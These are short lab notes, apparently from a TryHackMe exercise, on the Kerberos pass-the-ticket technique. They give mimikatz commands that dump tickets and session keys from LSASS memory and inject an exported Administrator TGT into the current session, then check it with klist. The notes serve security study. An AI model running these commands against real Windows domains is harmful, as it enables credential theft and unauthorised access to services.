Pass-the-Ticket - KERBEROS:
Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz. 
The process usually requires us to have SYSTEM privileges on the attacked machine and can be done as follows:

    1-  mimikatz # privilege::debug
        mimikatz # sekurlsa::tickets /export

*****
Notice that if we only had access to a ticket but not its corresponding session key, 
we wouldn't be able to use that ticket; therefore, both are necessary.

While mimikatz can extract any TGT or TGS available from the memory of the LSASS process, 
most of the time, we'll be interested in TGTs as they can be used to request access to any services the user is allowed to access
*****


Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:
    2-  mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi

    3-  On the windows machine:
        C:\> klist
